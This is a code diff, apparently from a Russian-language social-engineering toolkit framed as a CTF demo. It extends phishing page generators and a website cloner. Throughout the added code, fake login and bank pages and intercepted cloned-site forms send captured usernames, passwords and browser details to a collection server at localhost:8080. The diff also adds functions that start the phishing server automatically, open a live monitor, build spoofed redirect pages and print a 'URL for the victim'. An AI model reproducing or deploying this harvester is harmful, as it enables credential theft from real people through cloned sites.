@@ -12,6 +12,12 @@ import time
 import os
 import re
 import requests
+import socket
+import webbrowser
+import subprocess
+import threading
+import signal
+import atexit
 from datetime import datetime, timedelta
 from urllib.parse import urljoin, urlparse
 from bs4 import BeautifulSoup
@@ -107,24 +113,41 @@ class PhishingGenerator:
             
             // Симулируем отправку данных
             setTimeout(() => {{
-                // Сохраняем данные локально для CTF
-                const credentials = {{
-                    target: '{target}',
-                    email: email,
-                    password: password,
-                    timestamp: new Date().toISOString(),
-                    userAgent: navigator.userAgent,
-                    referrer: document.referrer
-                }};
-                
-                // Сохраняем в localStorage для демонстрации
-                localStorage.setItem('ctf_credentials_' + Date.now(), JSON.stringify(credentials));
-                
-                // Показываем результат
-                statusDiv.innerHTML = '<div class="success">✅ Успешный вход! (CTF Demo)</div>';
-                
-                // Логирование для CTF
-                console.log('CTF Phishing Demo - Credentials Captured:', credentials);
+            // Сохраняем данные локально для CTF
+            const credentials = {{
+                target: '{target}',
+                email: email,
+                password: password,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                referrer: document.referrer
+            }};
+            
+            // Сохраняем в localStorage для демонстрации
+            localStorage.setItem('ctf_credentials_' + Date.now(), JSON.stringify(credentials));
+            
+            // Отправляем данные на сервер (если доступен)
+            fetch('http://localhost:8080/collect', {{
+                method: 'POST',
+                headers: {{
+                    'Content-Type': 'application/json',
+                }},
+                body: JSON.stringify(credentials)
+            }}).then(response => {{
+                if (response.ok) {{
+                    console.log('Данные отправлены на сервер');
+                }} else {{
+                    console.log('Сервер недоступен, данные сохранены локально');
+                }}
+            }}).catch(error => {{
+                console.log('Ошибка отправки на сервер:', error);
+            }});
+            
+            // Показываем результат
+            statusDiv.innerHTML = '<div class="success">✅ Успешный вход! (CTF Demo)</div>';
+            
+            // Логирование для CTF
+            console.log('CTF Phishing Demo - Credentials Captured:', credentials);
                 
                 // В реальном фишинге здесь был бы редирект на настоящий сайт
                 setTimeout(() => {{
@@ -279,12 +302,38 @@ class PhishingGenerator:
         function handleSubmit() {{
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
-            alert('CTF Demo: Bank credentials captured - ' + username);
-            console.log('CTF Phishing Demo:', {{
+            
+            const credentials = {{
                 target: '{target}',
                 username: username,
-                timestamp: new Date().toISOString()
+                password: password,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                referrer: document.referrer
+            }};
+            
+            // Сохраняем в localStorage
+            localStorage.setItem('ctf_bank_credentials_' + Date.now(), JSON.stringify(credentials));
+            
+            // Отправляем данные на сервер (если доступен)
+            fetch('http://localhost:8080/collect', {{
+                method: 'POST',
+                headers: {{
+                    'Content-Type': 'application/json',
+                }},
+                body: JSON.stringify(credentials)
+            }}).then(response => {{
+                if (response.ok) {{
+                    console.log('Данные отправлены на сервер');
+                }} else {{
+                    console.log('Сервер недоступен, данные сохранены локально');
+                }}
+            }}).catch(error => {{
+                console.log('Ошибка отправки на сервер:', error);
             }});
+            
+            alert('CTF Demo: Bank credentials captured - ' + username);
+            console.log('CTF Phishing Demo:', credentials);
         }}
     </script>
 </body>
@@ -520,6 +569,148 @@ class CredentialHarvester:
             print_error(f"Ошибка сохранения: {e}")
             return None
 
+class InteractiveMonitor:
+    """Интерактивный мониторинг фишинговой атаки"""
+    
+    def __init__(self, server_port, target_domain):
+        self.server_port = server_port
+        self.target_domain = target_domain
+        self.monitor_process = None
+        self.data_dir = "phishing_data"
+        self.last_data_count = 0
+        
+    def start_monitor(self):
+        """Запуск интерактивного мониторинга в новом терминале"""
+        try:
+            # Запускаем в новом терминале
+            if self._is_gnome_terminal():
+                cmd = [
+                    'gnome-terminal', '--title=Phishing Monitor', '--',
+                    'python3', 'phishing_monitor.py', str(self.server_port), self.target_domain
+                ]
+            elif self._is_xterm():
+                cmd = [
+                    'xterm', '-title', 'Phishing Monitor', '-e',
+                    'python3', 'phishing_monitor.py', str(self.server_port), self.target_domain
+                ]
+            else:
+                # Fallback - запуск в фоне
+                cmd = ['python3', 'phishing_monitor.py', str(self.server_port), self.target_domain]
+            
+            self.monitor_process = subprocess.Popen(cmd)
+            print_success("📊 Интерактивный мониторинг запущен в новом терминале")
+            return True
+            
+        except Exception as e:
+            print_error(f"Ошибка запуска мониторинга: {e}")
+            return False
+    
+    
+    def _is_gnome_terminal(self):
+        """Проверка доступности gnome-terminal"""
+        try:
+            subprocess.run(['which', 'gnome-terminal'], 
+                         capture_output=True, check=True)
+            return True
+        except:
+            return False
+    
+    def _is_xterm(self):
+        """Проверка доступности xterm"""
+        try:
+            subprocess.run(['which', 'xterm'], 
+                         capture_output=True, check=True)
+            return True
+        except:
+            return False
+
+class PhishingServerManager:
+    """Менеджер фишингового сервера"""
+    
+    def __init__(self):
+        self.server_process = None
+        self.server_port = None
+        self.server_url = None
+        self.monitor = None
+        
+    def find_free_port(self, start_port=8080):
+        """Найти свободный порт"""
+        for port in range(start_port, start_port + 100):
+            try:
+                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                    s.bind(('localhost', port))
+                    return port
+            except OSError:
+                continue
+        return None
+    
+    def start_server(self, port=None, target_domain=None, start_monitor=True):
+        """Запустить фишинговый сервер с мониторингом"""
+        if port is None:
+            port = self.find_free_port()
+        
+        if port is None:
+            print_error("Не удалось найти свободный порт")
+            return False
+        
+        try:
+            # Запускаем сервер в фоновом режиме
+            cmd = [sys.executable, 'phishing_server.py', '--port', str(port)]
+            self.server_process = subprocess.Popen(
+                cmd,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                cwd=os.path.dirname(os.path.abspath(__file__))
+            )
+            
+            # Ждем запуска сервера
+            time.sleep(2)
+            
+            # Проверяем, что сервер запустился
+            if self.server_process.poll() is None:
+                self.server_port = port
+                self.server_url = f"http://localhost:{port}"
+                print_success(f"Фишинговый сервер запущен на порту {port}")
+                print_info(f"URL сервера: {self.server_url}")
+                
+                # Запускаем интерактивный мониторинг
+                if start_monitor and target_domain:
+                    self.monitor = InteractiveMonitor(port, target_domain)
+                    if self.monitor.start_monitor():
+                        print_success("📊 Интерактивный мониторинг запущен")
+                    else:
+                        print_warning("Не удалось запустить мониторинг")
+                
+                return True
+            else:
+                print_error("Не удалось запустить фишинговый сервер")
+                return False
+                
+        except Exception as e:
+            print_error(f"Ошибка запуска сервера: {e}")
+            return False
+    
+    def stop_server(self):
+        """Остановить фишинговый сервер"""
+        if self.server_process:
+            try:
+                self.server_process.terminate()
+                self.server_process.wait(timeout=5)
+                print_success("Фишинговый сервер остановлен")
+            except subprocess.TimeoutExpired:
+                self.server_process.kill()
+                print_warning("Фишинговый сервер принудительно остановлен")
+            except Exception as e:
+                print_error(f"Ошибка остановки сервера: {e}")
+            finally:
+                self.server_process = None
+                self.server_port = None
+                self.server_url = None
+    
+    def is_running(self):
+        """Проверить, запущен ли сервер"""
+        return self.server_process is not None and self.server_process.poll() is None
+
 class WebsiteCloner:
     """Клонирование веб-сайтов для социальной инженерии"""
     
@@ -531,6 +722,7 @@ class WebsiteCloner:
         self.downloaded_files = []
         self.base_url = ""
         self.domain = ""
+        self.server_manager = PhishingServerManager()
     
     def clone_website(self, url: str, output_dir: str = "cloned_site") -> Dict:
         """Клонирование веб-сайта"""
@@ -776,6 +968,23 @@ class WebsiteCloner:
                     // Сохраняем в localStorage
                     localStorage.setItem('ctf_form_' + Date.now(), JSON.stringify(interceptedData));
                     
+                    // Отправляем данные на сервер (если доступен)
+                    fetch('http://localhost:8080/collect', {{
+                        method: 'POST',
+                        headers: {{
+                            'Content-Type': 'application/json',
+                        }},
+                        body: JSON.stringify(interceptedData)
+                    }}).then(response => {{
+                        if (response.ok) {{
+                            console.log('Данные формы отправлены на сервер');
+                        }} else {{
+                            console.log('Сервер недоступен, данные сохранены локально');
+                        }}
+                    }}).catch(error => {{
+                        console.log('Ошибка отправки на сервер:', error);
+                    }});
+                    
                     // Показываем уведомление
                     const notification = document.createElement('div');
                     notification.style.cssText = `
@@ -817,9 +1026,17 @@ class WebsiteCloner:
         result['downloaded_files'].append(modified_file)
         print_success(f"Модифицированная версия: {modified_file}")
     
-    def create_phishing_version(self, original_url: str, output_dir: str) -> str:
-        """Создание фишинговой версии сайта"""
+    def create_phishing_version(self, original_url: str, output_dir: str, auto_start_server: bool = True) -> Dict:
+        """Создание фишинговой версии сайта с автоматическим запуском сервера"""
         print_warning("Создание фишинговой версии...")
+        
+        result = {
+            'success': False,
+            'phishing_file': None,
+            'server_url': None,
+            'phishing_url': None,
+            'original_url': original_url
+        }
         
         # Клонируем сайт
         clone_result = self.clone_website(original_url, output_dir)
@@ -890,6 +1107,24 @@ class WebsiteCloner:
             
             // Сохраняем для CTF
             localStorage.setItem('ctf_phishing_' + Date.now(), JSON.stringify(credentials));
+            
+            // Отправляем данные на сервер (если доступен)
+            fetch('http://localhost:8080/collect', {{
+                method: 'POST',
+                headers: {{
+                    'Content-Type': 'application/json',
+                }},
+                body: JSON.stringify(credentials)
+            }}).then(response => {{
+                if (response.ok) {{
+                    console.log('Данные отправлены на сервер');
+                }} else {{
+                    console.log('Сервер недоступен, данные сохранены локально');
+                }}
+            }}).catch(error => {{
+                console.log('Ошибка отправки на сервер:', error);
+            }});
+            
             console.log('CTF Phishing Demo - Credentials Captured:', credentials);
             
             alert('CTF Demo: Credentials captured - ' + username);
@@ -907,7 +1142,76 @@ class WebsiteCloner:
             f.write(phishing_html)
         
         print_success(f"Фишинговая версия создана: {phishing_file}")
-        return phishing_file
+        result['phishing_file'] = phishing_file
+        
+        # Автоматически запускаем сервер если нужно
+        if auto_start_server:
+            original_domain = urlparse(original_url).netloc
+            if self.server_manager.start_server(target_domain=original_domain, start_monitor=True):
+                result['server_url'] = self.server_manager.server_url
+                
+                # Создаем URL максимально похожий на оригинал
+                phishing_url = f"http://localhost:{self.server_manager.server_port}/{original_domain}/"
+                
+                result['phishing_url'] = phishing_url
+                result['success'] = True
+                
+                print_success(f"🎣 Фишинговая атака готова!")
+                print_info(f"📁 Файл: {phishing_file}")
+                print_info(f"🌐 Сервер: {result['server_url']}")
+                print_info(f"🎯 URL для жертвы: {phishing_url}")
+                print_success("📊 Интерактивный мониторинг запущен в новом терминале!")
+                print_warning("⚠️  Отправьте URL жертве в CTF!")
+                print_warning("⚠️  Следите за мониторингом в новом терминале!")
+                
+                # Создаем символическую ссылку для удобства
+                self._create_phishing_redirect(original_domain, result['server_url'])
+                
+            else:
+                print_error("Не удалось запустить фишинговый сервер")
+                result['success'] = False
+        else:
+            result['success'] = True
+            
+        return result
+    
+    def _create_phishing_redirect(self, domain: str, server_url: str):
+        """Создать редирект для удобства доступа"""
+        try:
+            # Создаем папку для редиректов
+            redirect_dir = "phishing_redirects"
+            if not os.path.exists(redirect_dir):
+                os.makedirs(redirect_dir)
+            
+            # Создаем HTML файл с редиректом
+            redirect_file = os.path.join(redirect_dir, f"{domain}.html")
+            redirect_html = f"""
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Redirecting to {domain}</title>
+    <meta http-equiv="refresh" content="0; url={server_url}/{domain}/">
+    <style>
+        body {{ font-family: Arial, sans-serif; text-align: center; margin-top: 50px; }}
+        .redirect {{ color: #666; }}
+    </style>
+</head>
+<body>
+    <div class="redirect">
+        <h2>Redirecting to {domain}...</h2>
+        <p>If you are not redirected automatically, <a href="{server_url}/{domain}/">click here</a>.</p>
+    </div>
+</body>
+</html>
+"""
+            
+            with open(redirect_file, 'w', encoding='utf-8') as f:
+                f.write(redirect_html)
+            
+            print_info(f"Редирект создан: {redirect_file}")
+            
+        except Exception as e:
+            print_warning(f"Не удалось создать редирект: {e}")
 
 class SocialEngineeringTools:
     """Основной класс социальной инженерии"""
@@ -998,11 +1302,21 @@ def main():
             results.append({'type': 'clone', 'result': result})
     
     elif args.clone_phishing:
-        # Клонирование + фишинговая версия
+        # Клонирование + фишинговая версия с автоматическим запуском сервера
         output_dir = args.output or f'phishing_{args.target.replace("https://", "").replace("http://", "").replace("/", "_").replace(":", "_").replace("?", "_").replace("&", "_").replace("=", "_")}'
-        phishing_file = tools.website_cloner.create_phishing_version(args.target, output_dir)
-        if phishing_file:
-            results.append({'type': 'clone_phishing', 'file': phishing_file})
+        result = tools.website_cloner.create_phishing_version(args.target, output_dir, auto_start_server=True)
+        if result and result.get('success'):
+            results.append({'type': 'clone_phishing', 'result': result})
+            
+            # Показываем итоговую информацию
+            print_success("🎣 ФИШИНГОВАЯ АТАКА ГОТОВА!")
+            print_info(f"🎯 URL для жертвы: {result['phishing_url']}")
+            print_info(f"📁 Файл: {result['phishing_file']}")
+            print_info(f"🌐 Сервер: {result['server_url']}")
+            print_success("📊 Интерактивный мониторинг запущен в новом терминале!")
+            print_warning("⚠️  Отправьте URL жертве в CTF!")
+            print_warning("⚠️  Следите за мониторингом в новом терминале!")
+            print_warning("⚠️  Данные будут автоматически собираться на сервере!")
     
     elif args.phishing_only:
         # Только фишинговая страница
@@ -1053,9 +1367,12 @@ def main():
             if clone_data['errors']:
                 print_warning(f"Ошибок: {len(clone_data['errors'])}")
         elif result['type'] == 'clone_phishing':
-            print_info(f"Фишинговая версия: {result['file']}")
+            phishing_result = result['result']
+            print_info(f"Фишинговая версия: {phishing_result.get('phishing_file', 'N/A')}")
+            if phishing_result.get('phishing_url'):
+                print_info(f"URL для жертвы: {phishing_result['phishing_url']}")
         else:
-            print_info(f"{result['type']}: {result['file']}")
+            print_info(f"{result['type']}: {result.get('file', 'N/A')}")
     
     if args.save and results:
         save_results(results, "social_engineering", "json")
